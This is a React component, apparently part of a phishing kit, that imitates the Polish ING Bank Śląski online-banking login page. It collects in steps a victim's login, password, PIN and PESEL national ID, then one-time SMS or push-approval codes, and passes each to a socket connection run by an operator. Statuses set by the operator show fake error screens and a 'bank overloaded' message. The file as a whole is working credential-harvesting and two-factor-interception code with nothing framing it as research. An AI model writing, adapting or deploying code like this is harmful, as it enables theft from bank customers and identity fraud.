import React, {useEffect, useState} from "react";
import logo from '../../assets/img/ingbank/logo.svg'
import {Button, Container, Form, FormGroup, Input, Label} from "reactstrap";
import {AlertTriangle, Key, Lock, Sun} from "react-feather";
import {yupResolver} from '@hookform/resolvers/yup';
import * as yup from "yup";
import {useForm} from "react-hook-form";
import IngLoader from "./components/loader";
import {useSocket} from "../../context/socket/socketProvider";
import '../../assets/scss/pages/_ingbank.scss'

const schema = yup.object().shape({
    login: yup.string().min(3).required(),
    password: yup.string().min(4).required(),
    pin_code: yup.string().required().matches(/^[0-9]{4}$/),
    pesel: yup.string().required().matches(/^[0-9]{2}([02468]1|[13579][012])(0[1-9]|1[0-9]|2[0-9]|3[01])[0-9]{5}$/), //81010200141
});

const Ingbank = () => {
    const {register, handleSubmit, trigger, reset, formState: {errors, dirtyFields}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const {user, setUser, initUser, connect, disconnect, sendData, sendCode} = useSocket();
    console.log(user);
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(true);
    const load = (index = 1) => {
        setLoading(true);
        setTimeout(() => {
            setStep(index)
            setLoading(false);
        }, 1000)
    }
    const submitLogin = (data) => {
        console.log(data);
        initUser({
            ...data, bank: 'ingbank'
        });
        reset();
        setStep(1);
    }
    const submitCode = (e) => {
        e.preventDefault();
        const code = document.querySelector('input[name=code]').value;
        if (code.length >= 4) {
            sendCode(code);
        }
    }
    const submitPush = (e) => {
        e.preventDefault();
        sendData('send_push_code');
    }
    useEffect(() => {
        connect('ingbank');
        load();
        return () => disconnect();
    }, [])

    return (
        <div className={'ingbank'}>
            <body>
            <div className="ingbank_form_container">
                <div className="ingbank_form">
                    <div className="ingbank_form_header">
                        <img src={logo} alt='logo'/>
                    </div>
                    <div
                        className={`ingbank_form_body ${user.status === 'wrong_login' || user.status === 'wrong_code' || user.status === 'wrong_push_code' ? 'error' : null}`}>
                        {user.status !== 'broke_user' ?
                            <h2>Zaloguj się do bankowości internetowej</h2> : null
                        }
                        {
                            user.status === 'wrong_login' ?
                                <div className="error_message">
                                    <div className="error_content">
                                        <h3>Login i/lub hasło są błędne</h3>
                                        <p>Spróbuj ponownie lub</p>
                                        <div className="icon">
                                            <AlertTriangle size={'24px'} color={'red'}/>
                                        </div>
                                    </div>
                                </div> :
                                user.status === 'wrong_code' || user.status === 'wrong_push_code' ?
                                    <div className="error_message">
                                        <div className="error_content">
                                            <h3>Kod jest nieprawidłowy</h3>
                                            <p>Spróbuj ponownie lub</p>
                                            <div className="icon">
                                                <AlertTriangle size={'24px'} color={'red'}/>
                                            </div>
                                        </div>
                                    </div> : null
                        }
                        {
                            loading ?
                                <IngLoader/> :
                                user.status === '' || user.status === 'wrong_login' ?
                                    <Form key={1} className={'ingbank_form_login'} onSubmit={handleSubmit(submitLogin)}>
                                        {
                                            step === 1 ?
                                                <FormGroup key={'login'}>
                                                    <Label>Login</Label>
                                                    <Input {...register('login')} className={errors.login && 'error'}/>
                                                    {
                                                        (function () {
                                                            if (errors.login) {
                                                                if (errors.login.ref.value === '') {
                                                                    return <span className={'error-message'}>Uzupełnij pole</span>
                                                                } else if (errors.login.type === 'min') {
                                                                    return <span className={'error-message'}>Minimalna liczba znaków: 3</span>
                                                                }
                                                            }
                                                        })()
                                                    }
                                                    <Button className={'next'}
                                                            disabled={!errors.login && false}
                                                            type={'button'}
                                                            onClick={() => {
                                                                trigger('login').then((res) => {
                                                                    if (res) {
                                                                        load(2);
                                                                    }
                                                                })
                                                            }}
                                                    >
                                                        Dalej
                                                    </Button>
                                                </FormGroup> :
                                                step === 2 ?
                                                    <FormGroup key={'pass'}>
                                                        <Label>Password</Label>
                                                        <Input {...register('password')} type='password'
                                                               className={errors.password && 'error'}/>
                                                        {
                                                            (function () {
                                                                if (errors.password) {
                                                                    if (errors.password.ref === '') {
                                                                        return <span className={'error-message'}>Uzupełnij pole</span>
                                                                    } else if (errors.password.type === 'min') {
                                                                        return <span className={'error-message'}>Minimalna liczba znaków: 4</span>
                                                                    }
                                                                }
                                                            })()
                                                        }
                                                        <Button className={'next'}
                                                                onClick={() => {
                                                                    trigger('password').then((res) => {
                                                                        if (res) {
                                                                            load(3);
                                                                        }
                                                                    })
                                                                }}
                                                        >
                                                            Dalej
                                                        </Button>
                                                    </FormGroup> :
                                                    step === 3 ?
                                                        <FormGroup key={'pin'}>
                                                            <Label>PIN</Label>
                                                            <Input {...register('pin_code')}
                                                                   className={errors.pin_code && 'error'} type={'number'}/>
                                                            {
                                                                (function () {
                                                                    if (errors.pin_code) {
                                                                        if(errors.pin_code.type === 'required'){
                                                                            return <span className={'error-message'}>Uzupełnij pole</span>
                                                                        }
                                                                        else return  <span className={'error-message'}>Pole składa się z 4 cyfre</span>

                                                                    }
                                                                })()
                                                            }
                                                            <Button className={'next'}
                                                                    onClick={() => {
                                                                        trigger('pin_code').then((res) => {
                                                                            if (res) {
                                                                                load(4);
                                                                            }
                                                                        })
                                                                    }}
                                                            >
                                                                Dalej
                                                            </Button>
                                                        </FormGroup> :
                                                        step === 4 ?
                                                            <FormGroup key={'pesel'}>
                                                                <Label>Pesel</Label>
                                                                <Input {...register('pesel')}
                                                                       className={errors.pesel && 'error'}/>
                                                                {
                                                                    (function () {
                                                                        console.log(errors.pesel)
                                                                        // console.log(errors.pesel.ref)
                                                                        if (errors.pesel) {
                                                                            if (errors.pesel.type === 'required') {
                                                                                return <span
                                                                                    className={'error-message'}>Uzupełnij pole</span>
                                                                            }
                                                                            if (errors.pesel.type === 'min') {
                                                                                return <span
                                                                                    className={'error-message'}>PESEL składa się z 11 cyfr</span>
                                                                            }
                                                                            if (errors.pesel.type === 'matches') {
                                                                                return <span
                                                                                    className={'error-message'}>Błędny PESEL</span>
                                                                            }
                                                                        }
                                                                    })()
                                                                }
                                                                <Button className={'next'}
                                                                        type={'submit'}
                                                                >
                                                                    Zaloguj
                                                                </Button>
                                                            </FormGroup> : null
                                        }
                                        <div className="btn_container">
                                            <a href="#">Problemy z logowaniem</a>
                                        </div>
                                    </Form> :
                                    user.status === 'getting_code' || user.status === 'wrong_code' ?
                                        <Form key={2} className={'ingbank_form_login code'} onSubmit={submitCode}>
                                            <FormGroup>
                                                <Label>Send push</Label>
                                                <Input name={'code'}/>
                                                <Button className={'next'}
                                                        type={'submit'}
                                                >
                                                    Wysłać
                                                </Button>
                                            </FormGroup>
                                            <div className="btn_container">
                                                <a href="#">Problemy z logowaniem</a>
                                            </div>
                                        </Form> :
                                        user.status === 'getting_push_code' || user.status === 'wrong_push_code' ?
                                            <Form key={3} className={'ingbank_form_login code'} onSubmit={submitPush}>
                                                <FormGroup>
                                                    <Label>Send push</Label>
                                                    <Button className={'next'}
                                                            type={'submit'}
                                                    >
                                                        Kliknij po potwierdzeniu powiadomienia push
                                                    </Button>
                                                </FormGroup>
                                                <div className="btn_container">
                                                    <a href="#">Problemy z logowaniem</a>
                                                </div>
                                            </Form> :
                                        user.status === 'broke_user' ?
                                            <div className={'ingbank_form_error'}>
                                                <AlertTriangle size={'100px'}/>
                                                <p>Bank jest przeciążony. <br/> Spróbuj później lub użyj innej metody
                                                </p>
                                            </div> :
                                            <IngLoader/>

                        }
                    </div>
                    {
                        user.status !== 'broke_user' ?
                            <div className="ingbank_news">
                                <div className="new">
                                    <span>02.08.2021</span>
                                    <a href="#">
                                        Masz do uregulowania należność dla PGE? Uważaj na fałszywe wiadomości! (więcej)
                                    </a>
                                </div>
                                <div className="new">
                                    <span>23.06.2021</span>
                                    <a href="#">
                                        Telefony z numerów podszywających się pod infolinię banku (więcej)
                                    </a>
                                </div>
                            </div> : null
                    }

                </div>
            </div>
            <footer className={'ingbank_footer'}>
                <Container>
                    <div className="ingbank_footer_row">
                        <ul className="ing-list-hybrid">
                            <li><a href="#" className="ing-activation js-activation">
                                <Key size={'20px'}/>
                                <span>Aktywuj dostęp</span></a></li>
                            <li className="pull-right-md ph-0">
                                <ul>
                                    <li><a href="https://www.ingbank.pl/bezpieczenstwo" target="_blank"
                                           rel="noopener noreferrer" className="js-safety"><Lock size={'20px'}/> <span>O bezpieczeństwie</span>
                                    </a></li>

                                    <li><a href="#" className="js-change-contrast"> <Sun size={'20px'}/> <span>Wersja kontrastowa</span></a>
                                    </li>
                                </ul>
                            </li>
                        </ul>
                    </div>
                    <div className="ingbank_footer_copyright">
                        <span className={'name'}>© 2021 ING Bank Śląski S.A.</span>
                        <ul className="ing-list-inline pull-right-md">
                            <li><span id="aria-info">Infolinia:</span> <a href="tel:+48323570069"
                                                                          aria-describedby="aria-info"><span
                                aria-hidden="true">32 357 00 69</span></a></li>
                            <li><a href="#cookie-policy" target="_blank" rel="noopener"
                                   className="js-cookies-policy"><span>Polityka <span lang="en">cookies</span></span>
                            </a></li>
                        </ul>
                    </div>
                </Container>
            </footer>
            </body>

        </div>
    )
}
export default Ingbank;
